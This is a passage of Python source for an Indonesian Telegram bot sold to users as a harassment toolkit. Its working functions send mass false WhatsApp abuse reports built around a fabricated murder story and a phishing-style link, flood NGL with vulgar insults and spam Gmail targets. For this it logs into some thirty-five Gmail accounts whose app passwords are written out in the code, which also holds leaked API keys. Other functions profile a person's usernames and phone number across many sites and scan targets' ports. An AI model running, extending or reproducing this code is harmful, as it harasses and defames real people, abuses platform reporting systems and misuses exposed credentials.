            success += 1
        time.sleep(1)
    return success

# ===================== FUNGSI SPAM REPORT WA =====================

EMAIL_TARGETS = [
        'abuse@whatsapp.com',
        'support@support.whatsapp.com',
        'business@support.whatsapp.com',
        'report@support.whatsapp.com',
        'account@support.whatsapp.com',
        'accounts@support.whatsapp.com',
        'legal@support.whatsapp.com',
        'security@support.whatsapp.com',
        'bugreport@support.whatsapp.com',
        'support@whatsapp.com',
        'smb@support.whatsapp.com',
        'business@support.whatsapp.com',
        'WhatsApp@gmail.com',
        'Suporte@support.whatsapp.com',
        'legal@whatsapp.com',
        'safety@support.whatsapp.com',
        'appeals@whatsapp.com',
        'dmca@whatsapp.com',
        'takedown@whatsapp.com',
        'privacy@whatsapp.com',
        'press@whatsapp.com',
    ]

def get_email_senders():
        return [
            {'email': 'termuxmikasa@gmail.com', 'app_password': 'jrpi ejvt rfte kuxd'},
            {'email': 'adrianardhiaksa86@gmail.com', 'app_password': 'vrhb arhq omjz pgus'},
            {'email': 'tt0861230@gmail.com', 'app_password': 'gtdy mllp rvft fdzt'},
            {'email': 'spamreportuntukproyek@gmail.com', 'app_password': 'rcjb wtpf cpmb zqmc'},
            {'email': 'ya2771326@gmail.com', 'app_password': 'bpex yhmi ymmm mzrt'},
            {'email': 'anonimousee909@gmail.com', 'app_password': 'vwsz udcr zwtn nddt'},
            {'email': 'anonimouse90909@gmail.com', 'app_password': 'hhgl fmji jsae sqxu'},
            {'email': 'anonimouse9099@gmail.com', 'app_password': 'qpss riuo pkjk tmeg'},
            {'email': 'anonimouse90999@gmail.com', 'app_password': 'ijrf hhuo jpml iysc'},
            {'email': 'aaabaaah2@gmail.com', 'app_password': 'oqtx elxg cefv dgvd'},
            {'email': 'anjaynathan399@gmail.com', 'app_password': 'cpil kwkt llab sodh'},
            {'email': 'joeellan26@gmail.com', 'app_password': 'wnfe iboi ktrr uder'},
            {'email': 'bayarutangllu@gmail.com', 'app_password': 'cbty vvaf rncu oawg'},
            {'email': 'asepanjang121@gmail.com', 'app_password': 'yidj nlkm irci yluy'},
            {'email': 'testimonialyayaya@gmail.com', 'app_password': 'mtkq kpaf gtjp zgbn'},
            {'email': 'buljem885@gmail.com', 'app_password': 'maug wpoh hddc uthh'},
            {'email': 'rahmanianabila75@gmail.com', 'app_password': 'elyn sgyr qqyx gxhi'},
            {'email': 'gufronjah@gmail.com', 'app_password': 'ulzr gfgd fhuj fahh'},
            {'email': 'dyantisukiem@gmail.com', 'app_password': 'zprf qelo tzqp wyac'},
            {'email': 'hilaryartasia@gmail.com', 'app_password': 'dscu jgry ikof ldcg'},
            {'email': 'satriaasiapayaaa@gmail.com', 'app_password': 'yzey ztnh apak xeva'},
            {'email': 'divikvidik@gmail.com', 'app_password': 'enkt cpcw beom ggey'},
            {'email': 'daemoniumuser@gmail.com', 'app_password': 'wgas iris atyy xpnc'},
            {'email': 'auto.send583@gmail.com', 'app_password': 'awlg kpsu rszi fppt'},
            {'email': 'cindyfiolita9@gmail.com', 'app_password': 'kpvu treo hfar zqdy'},
            {'email': 'gstorekonter4@gmail.com', 'app_password': 'xwdq ugie fbzw xeaa'},
            {'email': 'anonymousgalirus@gmail.com', 'app_password': 'ltnc fedd qzsy lfwu'},
            {'email': 'heckedbyx1@gmail.com', 'app_password': 'ibdf ukbz ugqd fqwu'},
            {'email': '0Anonymusy1@gmail.com', 'app_password': 'fvin nkbd tcrv wakf'},
            {'email': 'v8728799@gmail.com', 'app_password': 'wjng geyu qrjb qrkz'},
            {'email': 'malzoffcial5009@gmail.com', 'app_password': 'iebj mqgx xjuk wfs'},
            {'email': 'sonin.spd01@gmail.com', 'app_password': 'fkpp cyay qfdb syll'},
            {'email': 'shoope1456@gmail.com', 'app_password': 'ihwu mtuk ilpf hjng'},
            {'email': 'shoopee1456@gmail.com', 'app_password': 'bvee tsie vfgm spkk'},
            {'email': 'justzero194@gmail.com', 'app_password': 'nadf fgan fbew uyhc'},
        ]

def kirim_report_email(sender_info, nomor):
    try:
        subject = f"Report Abuse - {nomor}"
        body = f"""Para usuários de privacidade legal do WhatsApp.

Há notícias emocionantes, nomeadamente a descoberta da CABEÇA HUMANA.

Uma descoberta horrível foi relatada na área de Pasaje quando, por volta das 15h40, no FORTE LOS NARANJOS, os guardas do setor descobriram uma mochila suspeita.

Depois de examinar o conteúdo, uma cabeça humana foi encontrada no interior.

Policiais do circuito Velasco Ibarra foram imediatamente alertados e se deslocaram ao local para verificar a denúncia.

As autoridades confirmaram a presença da peça anatômica e iniciaram o isolamento da área para a realização dos procedimentos necessários.

Os investigadores estão atualmente a recolher informações sobre a origem da mala e as circunstâncias em que a mochila foi deixada.

A polícia solicitou a intervenção de unidades especiais para iniciar as investigações relacionadas.

Se você quiser ver as fotos do incidente, pode clicar no link 🔗👇

https://ibb.co.com/kJm3bzD

Abaixo está uma foto da vítima de homicídio 🔪🔪

Para mais informações sobre essa novidade maluca entre em contato pelo nosso WhatsApp 💬👇

https://web.whatsapp.com/xxx.canais/qioconvidativo/telefone/enviar?número={nomor}"""

        msg = MIMEMultipart()
        msg['From'] = sender_info['email']
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_info['email'], sender_info['app_password'])
        server.sendmail(sender_info['email'], EMAIL_TARGETS, msg.as_string())
        server.quit()
        return True
    except:
        return False

def run_spam_report(nomor):
    senders = get_email_senders()
    results = []
    for sender in senders:
        try:
            if kirim_report_email(sender, nomor):
                results.append("berhasil✅")
            else:
                results.append("Gagal❌")
        except:
            results.append("Error❌")
        time.sleep(0.5)
    return results


def spam_ngl(username):
    try:
        pesan = "Ngentod Asuu Memek, Bapak lu yatim"
        url = "https://ngl.link/api/submit"
        payload = {
            "username": username,
            "question": pesan,
            "deviceId": str(uuid.uuid4())
        }
        headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def run_spam_ngl(username):
    success = 0
    for i in range(20):
        if spam_ngl(username):
            success += 1
        time.sleep(0.3)
    return success


def osint_nomor(nomor):
    try:
        parsed = phonenumbers.parse(nomor, None)
        valid = phonenumbers.is_valid_number(parsed)
        possible = phonenumbers.is_possible_number(parsed)

        return {
            "nomor": nomor,
            "valid": "Ya" if valid else "Tidak",
            "possible": "Ya" if possible else "Tidak",
            "e164": phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164),
            "international": phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL),
            "nasional": phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.NATIONAL),
            "kode_negara": f"+{parsed.country_code}",
            "negara": phonenumbers.geocoder.description_for_number(parsed, 'id') or 'Tidak Diketahui',
            "operator": phonenumbers.carrier.name_for_number(parsed, 'id') or 'Tidak Diketahui',
            "timezone": ', '.join(phonenumbers.timezone.time_zones_for_number(parsed)) or 'Tidak Diketahui'
        }
    except:
        return None

def osint_username(username):
    platforms = [
            ("Instagram", "https://instagram.com/{username}"),
            ("Twitter", "https://twitter.com/{username}"),
            ("Facebook", "https://facebook.com/{username}"),
            ("TikTok", "https://tiktok.com/@{username}"),
            ("YouTube", "https://youtube.com/@{username}"),
            ("GitHub", "https://github.com/{username}"),
            ("GitLab", "https://gitlab.com/{username}"),
            ("Reddit", "https://reddit.com/user/{username}"),
            ("Pinterest", "https://pinterest.com/{username}"),
            ("Tumblr", "https://tumblr.com/{username}"),
            ("LinkedIn", "https://linkedin.com/in/{username}"),
            ("Telegram", "https://t.me/{username}"),
            ("Steam", "https://steamcommunity.com/id/{username}"),
            ("Spotify", "https://open.spotify.com/user/{username}"),
            ("Medium", "https://medium.com/@{username}"),
            ("DeviantArt", "https://deviantart.com/{username}"),
            ("VK", "https://vk.com/{username}"),
            ("Snapchat", "https://snapchat.com/add/{username}"),
            ("Twitch", "https://twitch.tv/{username}"),
            ("Vimeo", "https://vimeo.com/{username}"),
            ("Dribbble", "https://dribbble.com/{username}"),
            ("Behance", "https://behance.net/{username}"),
            ("ProductHunt", "https://producthunt.com/@{username}"),
            ("Keybase", "https://keybase.io/{username}"),
            ("Pastebin", "https://pastebin.com/u/{username}"),
            ("Replit", "https://replit.com/@{username}"),
            ("HackerNews", "https://news.ycombinator.com/user?id={username}"),
            ("Gravatar", "https://gravatar.com/{username}"),
            ("Flickr", "https://flickr.com/people/{username}"),
            ("Imgur", "https://imgur.com/user/{username}"),
            ("SoundCloud", "https://soundcloud.com/{username}"),
            ("Mixcloud", "https://mixcloud.com/{username}"),
            ("Bandcamp", "https://bandcamp.com/{username}"),
            ("LastFM", "https://last.fm/user/{username}"),
            ("Genius", "https://genius.com/{username}"),
            ("Patreon", "https://patreon.com/{username}"),
            ("Kickstarter", "https://kickstarter.com/profile/{username}"),
            ("Gumroad", "https://gumroad.com/{username}"),
            ("Etsy", "https://etsy.com/shop/{username}"),
            ("Fiverr", "https://fiverr.com/{username}"),
            ("Upwork", "https://upwork.com/freelancers/{username}"),
            ("Freelancer", "https://freelancer.com/u/{username}"),
            ("AngelList", "https://angel.co/u/{username}"),
            ("Crunchbase", "https://crunchbase.com/person/{username}"),
            ("AboutMe", "https://about.me/{username}"),
            ("Linktree", "https://linktr.ee/{username}"),
            ("Beacons", "https://beacons.ai/{username}"),
            ("AllMyLinks", "https://allmylinks.com/{username}"),
            ("Solo", "https://solo.to/{username}"),
            ("Carrd", "https://{username}.carrd.co"),
            ("Webflow", "https://{username}.webflow.io"),
            ("Wix", "https://{username}.wixsite.com/{username}"),
            ("WordPress", "https://{username}.wordpress.com"),
            ("Blogger", "https://{username}.blogspot.com"),
            ("Ghost", "https://{username}.ghost.io"),
            ("Hashnode", "https://hashnode.com/@{username}"),
            ("Dev.to", "https://dev.to/{username}"),
            ("Quora", "https://quora.com/profile/{username}"),
            ("StackOverflow", "https://stackoverflow.com/users/story/{username}"),
            ("CodePen", "https://codepen.io/{username}"),
            ("JSFiddle", "https://jsfiddle.net/{username}"),
            ("CodeSandbox", "https://codesandbox.io/u/{username}"),
            ("Glitch", "https://glitch.com/@{username}"),
            ("Vercel", "https://vercel.com/{username}"),
            ("Netlify", "https://{username}.netlify.app"),
            ("Heroku", "https://{username}.herokuapp.com"),
            ("PythonAnywhere", "https://{username}.pythonanywhere.com"),
            ("PyPI", "https://pypi.org/user/{username}"),
            ("NPM", "https://npmjs.com/~{username}"),
            ("RubyGems", "https://rubygems.org/profiles/{username}"),
            ("Crates.io", "https://crates.io/users/{username}"),
            ("Docker Hub", "https://hub.docker.com/u/{username}"),
            ("GitHub Sponsors", "https://github.com/sponsors/{username}"),
            ("Open Collective", "https://opencollective.com/{username}"),
            ("Ko-fi", "https://ko-fi.com/{username}"),
            ("Buy Me A Coffee", "https://buymeacoffee.com/{username}"),
            ("PayPal", "https://paypal.me/{username}"),
            ("Venmo", "https://venmo.com/{username}"),
            ("CashApp", "https://cash.app/{username}"),
            ("Kick", "https://kick.com/{username}"),
            ("Rumble", "https://rumble.com/user/{username}"),
            ("Odysee", "https://odysee.com/@{username}"),
            ("LBRY", "https://lbry.tv/@{username}"),
            ("DTube", "https://d.tube/#!/c/{username}"),
            ("Minds", "https://minds.com/{username}"),
            ("Gab", "https://gab.com/{username}"),
            ("Parler", "https://parler.com/profile/{username}"),
            ("TruthSocial", "https://truthsocial.com/@{username}"),
            ("Gettr", "https://gettr.com/user/{username}"),
            ("Clubhouse", "https://clubhouse.com/@{username}"),
            ("Signal", "https://signal.me/#p/{username}"),
            ("Discord", "https://discord.com/users/{username}"),
            ("Slack", "https://slack.com/{username}"),
            ("Zoom", "https://zoom.us/{username}"),
            ("Google", "https://google.com/search?q={username}"),
            ("Bing", "https://bing.com/search?q={username}"),
            ("DuckDuckGo", "https://duckduckgo.com/?q={username}"),
            ("Yandex", "https://yandex.com/search/?text={username}"),
        ]

    found = []
    for name, url in platforms:
        try:
            resp = requests.get(url, timeout=5)
            if resp.status_code == 200:
                found.append((name, url))
        except:
            pass
    return found

def osint_ip(ip):
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
        resp = requests.get(url, timeout=10)
        return resp.json()
    except:
        return {"status": "fail"}

def osint_domain(domain):
    try:
        ip = socket.gethostbyname(domain)
        whois_resp = requests.get(f"https://api.vercel.app/whois?domain={domain}", timeout=10)
        whois_data = whois_resp.json() if whois_resp.status_code == 200 else {}
        return {"domain": domain, "ip": ip, "whois": whois_data}
    except:
        return None

def tool_ip_tracker(ip):
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
        resp = requests.get(url, timeout=10)
        return resp.json()
    except:
        return {"status": "fail"}

def tool_port_scanner(domain):
    try:
        ip = socket.gethostbyname(domain)
        ports = []
        common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 3306, 3389, 5432, 5900, 6379, 8080, 8443]
        port_names = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
            53: "DNS", 80: "HTTP", 110: "POP3", 443: "HTTPS",
            993: "IMAPS", 995: "POP3S", 3306: "MySQL", 3389: "RDP",
            5432: "PostgreSQL", 5900: "VNC", 6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt"
        }

        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    ports.append({"port": port, "name": port_names.get(port, "Unknown")})
                sock.close()
            except:
                pass
        return {"domain": domain, "ip": ip, "open_ports": ports}
    except:
        return None

def tool_cek_kode_pos(kode_pos):
    try:
        url = "https://raw.githubusercontent.com/x7f9k2m4n6j4h8t2v9p5s3k1/a7k3m9x2v64282T7f/63b10b66cb8373e3107759f271631413aa8e18fa/kodepos.json"
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            if kode_pos in data:
                return data[kode_pos]
        return None
    except:
        return None

def tool_cek_npsn(npsn):
    try:
        curl_cmd = f"""curl -s -X POST 'https://sekolah.data.kemendikdasmen.go.id/v1/sekolah-service/sekolah/cari-sekolah' -H 'Content-Type: application/json' -d '{{"page":0,"size":12,"keyword":"{npsn}","kabupaten_kota":"","bentuk_pendidikan":"","status_sekolah":""}}'"""
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        if result.returncode == 0 and result.stdout:
            data = json.loads(result.stdout)
            if data.get('status_code') == 200 and data.get('data') and len(data['data']) > 0:
                return data['data'][0]
        return None
    except:
        return None

def tool_freefire_checker(uid):
    try:
        url = f"https://api.nexray.eu.cc/stalker/freefire?uid={uid}"
        headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
        resp = requests.get(url, headers=headers, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            return data.get('result', {})
        return None
    except:
        return None

def tool_roblox_checker(username):
    try:
        url = f"https://api.nexray.eu.cc/stalker/roblox?username={username}"
        headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
        resp = requests.get(url, headers=headers, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') == True:
                return data.get('result', {})
        return None
    except:
        return None

def spam_gmail(target_email, custom_message):
    senders = get_email_senders()
    success_count = 0

    if custom_message:
        subject = custom_message[:100]
        body = custom_message
    else:
        subject = "Penting: Informasi Akun Anda"
        body = """Kepada Pengguna Akun Gmail.

Kami mendeteksi aktivitas mencurigakan pada akun Anda. Untuk keamanan, 
kami menyarankan Anda untuk segera mengubah kata sandi.
Jika Anda tidak melakukan aktivitas ini, abaikan email ini.

Terima kasih,
Tim Keamanan."""

    for sender in senders:
        try:
            msg = MIMEText(body)
            msg['Subject'] = subject
            msg['From'] = sender['email']
            msg['To'] = target_email

            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(sender['email'], sender['app_password'])
            server.sendmail(sender['email'], target_email, msg.as_string())
            server.quit()

            success_count += 1

        except Exception as e:
            continue

    return success_count

def run_spam_gmail(target_email, custom_message):
    total_senders = len(get_email_senders())
    success = spam_gmail(target_email, custom_message)
    return success, total_senders

def tool_cek_gtk(keyword):
    try:
        url = f"https://gtk.belajar.kemendikdasmen.go.id/akun/ptk-solr?keyword={keyword}"
        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            if data and 'data' in data and len(data['data']) > 0:
                return data['data'][0]
        return None
    except:
        return None

def tool_cek_imei(imei):
    try:
        url = "https://www.officialsimunlock.com/Home/GetIMEI"
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        data = {"imei": imei}
        resp = requests.post(url, data=data, headers=headers, timeout=15)
        if resp.status_code == 200:
            return resp.json()
        return None
    except:
        return None

def tool_web_phising_checker(url):
    try:
        encoded_url = quote(url, safe='')
        api_url = f"https://api.nexray.eu.cc/tools/webphishing?url={encoded_url}"
        resp = requests.get(api_url, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') == True:
                return data.get('result', {})
        return None
    except:
        return None

def tool_web_recon(domain):
    try:
        ip = socket.gethostbyname(domain)
        subs = []
        try:
            resp = requests.get(f"https://api.hackertarget.com/hostsearch/?q={domain}", timeout=15)
            if resp.status_code == 200:
                for line in resp.text.splitlines():
                    parts = line.split(",")
                    if len(parts) >= 2:
                        subs.append(parts[0].strip())
        except:
            pass

        ports = []
        common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 3306, 3389, 5432, 5900, 6379, 8080, 8443]
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    ports.append(port)
                sock.close()
            except:
                pass

        return {
            "domain": domain,
            "ip": ip,
            "subdomains": subs[:20],
            "open_ports": ports,
            "total_subs": len(subs)
        }
    except:
        return None

def tool_link_shortener(url):
    try:
        API_KEY = "359a67146d8eab794ace58510de8598fe4cae"
        resp = requests.get(f'https://cutt.ly/api/api.php?key={API_KEY}&short={url}', timeout=15)
        data = resp.json()
        if data.get('url') and data['url'].get('status') == 7:
            return data['url'].get('shortLink')
        return None
    except:
        return None

def tool_cek_resi(courier, awb):
    try:
        API_KEY = "sk_zowtunnrch9ljvt8p7hs6bvfmid9r1hvv5p9qiamsazix6ltvo3kuudcjgwyqtfm"
        url = f'https://api.binderbyte.com/v1/track?api_key={API_KEY}&courier={courier}&awb={awb}'
        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') == 200:
                return data.get('data', {})
        return None
    except:
        return None

def upload_to_catbox(file_path):
    try:
        with open(file_path, 'rb') as f:
            files = {'fileToUpload': (os.path.basename(file_path), f)}
            data = {'reqtype': 'fileupload'}
            resp = requests.post('https://catbox.moe/user/api.php', files=files, data=data, timeout=60)
            if resp.status_code == 200:
                url = resp.text.strip()
                if url.startswith('https://'):
                    return url
        return None
    except:
        return None

class MikasaBot:
    def handle_document(self, update, context):
        user_id = str(update.effective_user.id)
        state = context.user_data.get('state', '')

        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        if state in ['upload_photo', 'upload_file']:
            document = update.message.document or update.message.photo or update.message.video

            if not document:
                update.message.reply_text("❌ File tidak ditemukan!")
                return

            file = document.get_file()
            file_size = file.file_size / (1024 * 1024)

            if file_size > 200 and state == 'upload_photo':
                update.message.reply_text("❌ File terlalu besar! Maksimal 200MB")
                return

            if file_size > 10240 and state == 'upload_file':
                update.message.reply_text("❌ File terlalu besar! Maksimal 10GB")
                return

            update.message.reply_text(format_loading("Mengupload File"))

            try:
                file_path = f"temp_{user_id}_{int(time.time())}"
                file.download_to_drive(file_path)

                url = upload_to_catbox(file_path)
                os.remove(file_path)

                if url:
                    update.message.reply_text(
                        format_success(
                            "𝐔𝐏𝐋𝐎𝐀𝐃 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋✅",
                            f"📎 File: {document.file_name or 'file'}\n"
                            f"📊 Size: {file_size:.2f} MB\n"
                            f"🔗 URL: {url}"
                        ),
                        parse_mode=ParseMode.MARKDOWN
                    )
                else:
                    update.message.reply_text("❌ Gagal upload file!")

                context.user_data['state'] = ''

            except Exception as e:
                update.message.reply_text(format_error(str(e)))

    def __init__(self, token):
        self.token = token
        self.app = None
        self.users = load_users()
        self.user_data = {}

    def start(self, update, context):
        user_id = str(update.effective_user.id)
        username = update.effective_user.username or "Unknown"
        first_name = update.effective_user.first_name or "User"

        uid = get_uid()
        status, user_data = cek_uid(uid)

        if status is None:
            update.message.reply_text(
                f"❌ *Gagal terhubung ke server lisensi.*"
            )
            return

        if user_id in self.users:
            user_data_local = self.users[user_id]
            if user_data_local.get('status') == 'active':
                self.send_welcome(update, context, first_name)
                return
            else:
                update.message.reply_text(
                    f"⏳ *Akun Belum Aktif*\n\n"
                    f"👤 Nama: {user_data_local.get('nama', 'User')}\n\n"
                    f"Menunggu verifikasi dari admin."
                )
                return

        update.message.reply_text(
            f"🔐 *REGISTRASI DIPERLUKAN*\n\n"
            f"Gunakan: `/register nama_anda`\n"
            f"Contoh: `/register Rullzzz_06`"
        )
        context.user_data['state'] = 'waiting_register'

    def send_welcome(self, update, context, name):
        keyboard = [
            [InlineKeyboardButton("〔 1 〕𝐒𝐏𝐀𝐌 𝐌𝐄𝐍𝐔", callback_data="menu_spam")],
            [InlineKeyboardButton("〔 2 〕𝐎𝐒𝐈𝐍𝐓 & 𝐓𝐀𝐑𝐂𝐊𝐄𝐑", callback_data="menu_osint")],
            [InlineKeyboardButton("〔 3 〕𝐔𝐓𝐈𝐋𝐈𝐓𝐘", callback_data="menu_utility")],
            [InlineKeyboardButton("〔 4 〕𝐌𝐄𝐍𝐔 𝐀𝐋𝐋", callback_data="menu_all")],
            [InlineKeyboardButton("〔 5 〕𝐂𝐋𝐎𝐒𝐄", callback_data="menu_close")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        caption = (
            f"𝙈𝙄𝙆𝘼𝙎𝘼 𝘽𝙊𝙏 𝙈𝘿\n"
            f"𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑: 𝐑𝐮𝐥𝐥𝐳𝐳𝐳𝟎𝟔\n\n"
            f"𝙷𝚊𝚕𝚘 {name}! 𝙱𝚘𝚝 𝚒𝚗𝚒 𝚍𝚒 𝙱𝚞𝚊𝚝 𝙾𝚕𝚎𝚑"
            f"𝐑𝐮𝐥𝐥𝐳𝐳𝐳𝟎𝟔, 𝙳𝚊𝚗 𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝙼𝚎𝚖𝚒𝚕𝚒𝚑 𝐊𝐚𝐭𝐞𝐠𝐨𝐫𝐲"
            f"𝙳𝚒 𝙱𝚊𝚠𝚊𝚑 𝚒𝚗𝚒 😈👇"
        )

        try:
            update.message.reply_photo(
                photo=BANNER_URL,
                caption=caption,
                reply_markup=reply_markup,
                parse_mode=ParseMode.MARKDOWN
            )
        except:
            update.message.reply_text(
                caption,
                reply_markup=reply_markup,
                parse_mode=ParseMode.MARKDOWN
            )

    def register(self, update, context):
        user_id = str(update.effective_user.id)
        username = update.effective_user.username or "Unknown"

        args = context.args
        if not args:
            update.message.reply_text(
                f"❌ *Format Salah!*\n\n"
                f"Gunakan: `/register nama_anda`"
            )
            return

        nama = ' '.join(args).strip()

        if len(nama) < 3:
            update.message.reply_text("❌ Nama minimal 3 karakter!")
            return
        if len(nama) > 30:
            update.message.reply_text("❌ Nama maksimal 30 karakter!")
            return
        if not re.match(r'^[a-zA-Z0-9_.\s]+$', nama):
            update.message.reply_text("❌ Nama hanya boleh huruf, angka, underscore, titik, dan spasi!")
            return

        if user_id in self.users:
            update.message.reply_text(
                f"⚠️ *Kamu sudah terdaftar!*\n\n"
                f"Status: {'Aktif' if self.users[user_id].get('status') == 'active' else 'Pending'}"
            )
            return

        uid = get_uid()
        self.users[user_id] = {
            "id": user_id,
            "username": username,
            "nama": nama,
            "uid": uid,
            "status": "pending",
            "registered_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        save_users(self.users)

        self.notify_admin(
            f"🔑 *REGISTRASI USER BARU*\n\n"
            f"🆔 User ID: `{user_id}`\n"
            f"👤 Username: @{username}\n"
            f"👤 Nama: {nama}\n"
            f"🆔 UID: `{uid}`\n"
            f"🕐 Waktu: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n\n"
            f"Verifikasi: `/verify {user_id}`"
        )

        update.message.reply_text(
            f"✅ *Registrasi Berhasil!*\n\n"
            f"👤 Nama: {nama}\n"
            f"⏳ Menunggu Verifikasi Admin"
        )

    def verify(self, update, context):
        user_id = str(update.effective_user.id)

        if int(user_id) != ADMIN_ID:
            update.message.reply_text("❌ *Akses Ditolak!* Hanya admin.")
            return

        args = context.args
        if not args:
            update.message.reply_text(
                f"❌ *Format Salah!*\n\n"
                f"Gunakan: `/verify user_id`"
            )
            return

        target_id = args[0].strip()

        if target_id not in self.users:
            update.message.reply_text(f"❌ User ID `{target_id}` tidak ditemukan!")
            return

        self.users[target_id]['status'] = 'active'
        save_users(self.users)

        update.message.reply_text(
            f"✅ *User Berhasil Diverifikasi!*\n\n"
            f"🆔 ID: `{target_id}`\n"
            f"👤 Nama: {self.users[target_id].get('nama', 'Unknown')}"
        )

        try:
            context.bot.send_message(
                chat_id=int(target_id),
                text=f"✅ *Akun Diverifikasi!*\n\n"
                     f"Gunakan /start untuk memulai."
            )
        except:
            pass

    def notify_admin(self, message, parse_mode="Markdown"):
        try:
            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
            payload = {"chat_id": ADMIN_ID, "text": message, "parse_mode": parse_mode}
            requests.post(url, json=payload, timeout=10)
        except:
            pass

    def is_verified(self, user_id):
        user_id = str(user_id)
        if user_id not in self.users:
            return False
        return self.users[user_id].get('status') == 'active'

    # ===================== COMMAND HANDLERS =====================

    def cmd_spam_otp(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=SPAM_OTP_IMG,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐒𝐏𝐀𝐌 𝐎𝐓𝐏\n"
                    f"𝘿𝙀𝙑𝙀𝙇𝙊𝙋: 𝐑𝐮𝐥𝐥𝐳𝐳𝐳𝟎𝟔\n\n"
                    f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙉𝙤𝙢𝙤𝙧:\n"
                    f"/spamotp 628xxxxxxxxx"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        nomor = args[0].strip()
        if nomor.startswith('0'):
            nomor = nomor
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]

        update.message.reply_text(format_loading("Mengirim Spam OTP"))

        try:
            results = run_spam_otp(nomor)
            success = sum(1 for r in results if '✅' in r)
            failed = len(results) - success

            detail = "\n".join(results)
            update.message.reply_text(
                format_success(
                    "𝐒𝐏𝐀𝐌 𝐎𝐓𝐏 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                    "KETIK /start FOR BACK\n",
                ),
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_spam_call(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐒𝐏𝐀𝐌 𝐂𝐀𝐋𝐋\n"
                    f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
                    f"/spamcall 62xxxxxxxxx"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        nomor = args[0].strip()
        if not nomor.startswith('62'):
            update.message.reply_text("❌ Nomor harus diawali 62!")
            return

        update.message.reply_text(format_loading("Mengirim Spam Call"))

        try:
            success = run_spam_call(nomor)
            update.message.reply_text(
                format_success(
                    "𝐒𝐏𝐀𝐌 𝐂𝐀𝐋𝐋 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                    "KETIK /start FOR BACK",
                ),
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def button_callback(self, update, context):
        query = update.callback_query
        query.answer()

        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            query.message.reply_text("❌ *Akses Ditolak!*")
            return

        data = query.data

        if data == "menu_spam":
            keyboard = [
                [InlineKeyboardButton("⬅️ Kembali", callback_data="menu_back")],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            caption = (
                f" KATEGORI SPAM\n\n"
                f"╭───〔 1 〕───╮\n"
                f"│ 𝙎𝙋𝘼𝙈 𝙈𝙀𝙉𝙐 :\n"
                f"│ /spamotp\n"
                f"│ /spamcall\n"
                f"│ /spampair\n"
                f"│ /spamrepwa\n"
                f"│ /spamngl\n"
                f"│ /spamgmail\n"
                f"╰────────────────────────────╯\n\n"
                f"📌 *Cara penggunaan:*\n"
                f"Ketik command di atas dengan nomor target\n"
                f"Contoh: /spamotp 628xxxxxxxxx"
            )
